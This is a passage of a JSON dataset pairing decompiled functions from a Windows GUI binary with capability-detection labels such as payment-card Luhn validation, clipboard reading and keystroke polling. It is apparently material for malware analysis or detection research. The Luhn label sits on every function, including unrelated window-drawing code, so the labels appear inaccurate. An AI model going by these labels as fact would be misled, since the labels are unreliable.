        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430fc8(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x430fe3;\n    fcn.00447be4();\n    puStack40 = 0x430fed;\n    fcn.0043b920();\n    puStack40 = 0x430ff5;\n    fcn.0043b77c();\n    uStack44 = 0x431071;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x431038;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x492330 = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 292
    },
    "00431150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00431150(void)\n\n{\n    uint uVar1;\n    \n    *0x499bb8 = sub.user32.dll_RegisterWindowMessageA(0x4311b4);\n    *0x499bbc = sub.user32.dll_RegisterWindowMessageA(0x4311c4);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.0040af18(uVar1);\n    *0x492334 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004314a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write clipboard data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004314a0(uint dwBytes)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hMem;\n    uint var_4h;\n    \n    puStack28 = 0x4314bb;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431572;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = dwBytes;\n    uStack44 = 0x2002;\n    puStack48 = 0x4314d4;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_GlobalAlloc();\n    uStack52 = 0x431544;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x4314ee;\n    uStack60 = uVar1;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalLock();\n    uStack68 = 0x431533;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.004313dc();\n    uVar2 = in_EDX & 0xffff;\n    sub.user32.dll_SetClipboardData(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    uStack72 = 0x43153a;\n    sub.kernel32.dll_GlobalUnlock(uVar1);\n    return;\n}\n",
        "token_count": 464
    },
    "00431630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00431630(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    uint arg_8h;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x431647;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x4316d8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while( true ) {\n        if (uVar2 == 0) {\n            fcn.0040dbb8();\n            fcn.00404ec4();\n            *in_FS_OFFSET = uStack40;\n            uStack32 = 0x4316df;\n            uStack36 = 0x4316d7;\n            (**(*in_EAX + 0x14))();\n            return;\n        }\n        cVar1 = fcn.00427500();\n        if (cVar1 != '\\0') break;\n        uStack40 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    sub.user32.dll_GetClipboardData(uVar2);\n    arg_8h = sub.user32.dll_GetClipboardData(9);\n    fcn.00427410(arg_8h);\n    fcn.00404f70();\n    return;\n}\n",
        "token_count": 377
    },
    "00431970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431970(uint param_1, uint32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x431984;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x4319b4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData();\n    *in_FS_OFFSET = param_2 & 0xffff;\n    uStack24 = 0x4319bb;\n    uStack28 = 0x4319b3;\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 213
    },
    "00431c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431c5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044a5f8();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 151
    },
    "004323a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004323a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004322f0();\n    (***0x494a88)(uVar1);\n    return;\n}\n",
        "token_count": 90
    },
    "004323ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004323ec(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004322f0();\n    (***0x494a40)(uVar1);\n    return;\n}\n",
        "token_count": 77
    },
    "004328fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004328fc(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x432916;\n    var_4h = param_2;\n    uStack92 = fcn.004585f8();\n    puStack96 = 0x43291c;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.004328fc::nLeftRect;\n        uStack100 = 0x432931;\n        uStack100 = fcn.004585f8();\n        iStack104 = 0x432937;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.004328fc::nLeftRect;\n        uStack116 = 0x43294c;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x432954;\n        uStack116 = fcn.004585f8();\n        puStack120 = 0x43295a;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x432a57;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.004585f8(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.004328fc::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00418448(&fcn.004328fc::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.004328fc::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.00432498();\n        uVar2 = 0;\n        fcn.004323ec(0, &fcn.004328fc::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.004585f8(hdc, 0x432a5e);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 942
    },
    "004347e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004347e4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) {\n        fcn.0043718c();\n        fcn.00437674();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.004383e0();\n    }\n    fcn.00433f88();\n    return;\n}\n",
        "token_count": 133
    },
    "004361a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004361a4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00436f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436f88(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004055c8();\n    return;\n}\n",
        "token_count": 235
    },
    "00437a24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00437a24(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00433f88();\n    return 0;\n}\n",
        "token_count": 63
    },
    "00437d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint32_t fcn.00437d9c(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 252
    },
    "00439150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439150(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    uVar1 = param_2[1];\n    *(in_EAX + 0x58) = *param_2;\n    *(in_EAX + 0x5c) = uVar1;\n    return;\n}\n",
        "token_count": 86
    },
    "0043b920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043b920(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x492524;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x492524 = 0;\n    uStack36 = 0x43b9d1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x492520 = 1;\n    uStack48 = 0x43b993;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b8d0, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x492520 = 0;\n    *0x492524 = uVar1;\n    return;\n}\n",
        "token_count": 292
    },
    "0043bb34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nuint64_t fcn.0043bb34(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    code *pcVar2;\n    uint uStack12;\n    uchar uStack8;\n    \n    uStack12 = sub.user32.dll_GetActiveWindow();\n    uStack8 = 0;\n    if (in_AL == '\\0') {\n        pcVar2 = fcn.0043badc;\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043badc, &uStack12);\n        sub.user32.dll_EnumThreadWindows(uVar1);\n    }\n    else {\n        pcVar2 = fcn.0043bafc;\n        sub.user32.dll_EnumWindows(fcn.0043bafc, &uStack12);\n    }\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 191
    },
    "0043bda0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043bda0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43be11;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.0043bd90();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db38(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43be18;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 289
    },
    "0043be20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043be20(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 324
    },
    "0043c9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043c9c0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00453534();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x43ca34;\n    uVar1 = fcn.0043be20(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.0043be20(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 253
    },
    "0043cdac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cdac(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x250) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x254) + 0x1a);\n        fcn.00450324(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.004503d4();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.00450324();\n        fcn.004503d4();\n        if (iVar5 < 0) {\n            fcn.0043c61c();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.00450210();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.00450210();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.00450210();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.00450210(iVar6, iVar7, iVar3);\n                fcn.0043c61c();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.0043c61c();\n        }\n        else {\n            iVar5 = fcn.00450254();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.00450254();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.00450254();\n                }\n                fcn.00450254();\n                fcn.0043c61c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "0043cfcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043cfcc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x43d038;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00456a48();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 179
    },
    "0043d184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d184(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x43d1e5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.00457944();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 221
    },
    "0043d214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043d214(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x43d232;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x43d378;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x43d254;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x494ce8 + 0x14))();\n    uStack320 = 0x43d358;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x43d273;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x43d27b;\n    iVar2 = fcn.00404528();\n    if ((iVar2 != *0x43a2e8) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x43d320;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00419658();\n        if (cVar1 == '\\0') {\n            fcn.00404530();\n            var_10h = &fcn.0043d214::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.0043d214::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00407550();\n            fcn.0040db38(in_stack_fffffea4, arg_ch);\n            fcn.00404ec4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x43d35f;\n    uStack324 = 0x43d357;\n    (**(***0x494ce8 + 0x18))();\n    return;\n}\n",
        "token_count": 780
    },
    "0043e238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e238(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00458b60(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.00420604(),  -1 < var_8h + -1)) {\n        do {\n            fcn.004205d8();\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00441f24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441f24(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00442b0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442b0c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x442b79;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.0040484c();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00442c80();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 202
    },
    "004437f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004437f0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.00456fac();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 65
    },
    "00443a6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00443a6c(void)\n\n{\n    uint uStack20;\n    \n    fcn.00443ad4();\n    return uStack20;\n}\n",
        "token_count": 36
    },
    "00443a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00443a84(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.00443ad4();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "00443aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00443aa0(void)\n\n{\n    uint uStack16;\n    \n    fcn.00443ad4();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00443ab8": {
        "rules": [
